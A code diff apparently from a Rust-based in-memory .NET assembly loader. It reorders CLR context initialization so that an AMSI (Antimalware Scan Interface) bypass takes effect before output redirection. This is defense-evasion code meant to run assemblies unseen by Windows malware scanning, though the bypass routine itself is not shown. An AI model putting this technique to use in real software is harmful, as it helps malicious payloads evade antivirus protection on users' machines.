@@ -372,9 +372,15 @@ impl Clr {
         // Register the assembly bytes
         bypass_loader.register_assembly(assembly_identity, self.contents.clone())?;
 
+        // IMPORTANT: initialize context with AMSI bypass BEFORE redirect_output().
+        // redirect_output() calls get_context() internally, which would start the CLR
+        // without the AMSI bypass if called first. Since get_context() returns the
+        // existing context if already initialized, we must set the bypass context first.
+        self.get_context_with_amsi_bypass(bypass_loader)?;
+
         self.redirect_output()?;
 
-        let context = self.get_context_with_amsi_bypass(bypass_loader)?;
+        let context = self.context.as_ref().ok_or("Context not initialized")?;
 
         // Load using Load_2 with our custom identity
         // The CLR will call our ProvideAssembly which returns the bytes via IStream
